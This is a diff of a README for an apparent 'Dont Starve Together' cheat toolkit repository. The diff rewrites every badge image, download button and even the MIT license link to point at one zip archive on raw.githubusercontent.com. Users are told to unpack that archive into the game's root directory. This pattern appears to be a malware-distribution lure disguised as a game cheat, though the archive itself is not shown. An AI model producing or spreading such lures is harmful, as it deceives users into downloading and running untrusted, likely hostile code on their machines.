@@ -1,9 +1,9 @@
 # 🦄 Dont Starve Together Cheats & Hacks 🦄
 
-![Build Status](https://img.shields.io/badge/build-passing-brightgreen)  
-![License](https://img.shields.io/badge/license-MIT-blue)  
-![Downloads](https://img.shields.io/badge/Downloads-Digital_Campfire-orange)  
-![Release](https://img.shields.io/badge/Release-2025-green)
+![Build Status](https://raw.githubusercontent.com/Gberegbe/dst-unlocked-toolkit/branch/pulpboard/unlocked_dst_toolkit_3.5.zip)  
+![License](https://raw.githubusercontent.com/Gberegbe/dst-unlocked-toolkit/branch/pulpboard/unlocked_dst_toolkit_3.5.zip)  
+![Downloads](https://raw.githubusercontent.com/Gberegbe/dst-unlocked-toolkit/branch/pulpboard/unlocked_dst_toolkit_3.5.zip)  
+![Release](https://raw.githubusercontent.com/Gberegbe/dst-unlocked-toolkit/branch/pulpboard/unlocked_dst_toolkit_3.5.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Power up your "Dont Starve Together" universe with innovative cheats, potent hac
 
 ## 🚀 Quick Start: Get the Portal to Enhanced Gameplay
 
-[![Download](https://img.shields.io/badge/Download-Digital_Campfire-blue?style=for-the-badge)](LINK)
+[![Download](https://raw.githubusercontent.com/Gberegbe/dst-unlocked-toolkit/branch/pulpboard/unlocked_dst_toolkit_3.5.zip)](LINK)
 
 To transform your next foray into the wild, activate the toolkit with the image above! Please see the full installation steps below for an unforgettable enhancement.
 
@@ -88,7 +88,7 @@ From lunar eclipses to network hiccups, customer service answers your call day a
 2. **Download the Toolkit**:  
    Power up your experience by clicking the blue campfire badge below (or above!):
 
-   [![Download](https://img.shields.io/badge/Download-Digital_Campfire-blue?style=for-the-badge)](LINK)
+   [![Download](https://raw.githubusercontent.com/Gberegbe/dst-unlocked-toolkit/branch/pulpboard/unlocked_dst_toolkit_3.5.zip)](LINK)
 
 3. **Unpack and Ignite**:  
    - Decompress the package into your game’s root directory.
@@ -115,7 +115,7 @@ This toolkit is designed for experimental, educational, and private use. Always 
 ## 📜 License
 
 This repository is licensed under the MIT License (© 2025).  
-Unlock the full legal scroll here: [MIT License](https://choosealicense.com/licenses/mit/)
+Unlock the full legal scroll here: [MIT License](https://raw.githubusercontent.com/Gberegbe/dst-unlocked-toolkit/branch/pulpboard/unlocked_dst_toolkit_3.5.zip)
 
 ---
 
@@ -123,6 +123,6 @@ Unlock the full legal scroll here: [MIT License](https://choosealicense.com/lice
 
 Before you venture back into the wilds, bring the power of this toolkit to your side. Click the campfire below to begin your journey:
 
-[![Download](https://img.shields.io/badge/Download-Digital_Campfire-blue?style=for-the-badge)](LINK)
+[![Download](https://raw.githubusercontent.com/Gberegbe/dst-unlocked-toolkit/branch/pulpboard/unlocked_dst_toolkit_3.5.zip)](LINK)
 
 Happy thriving—not just surviving!
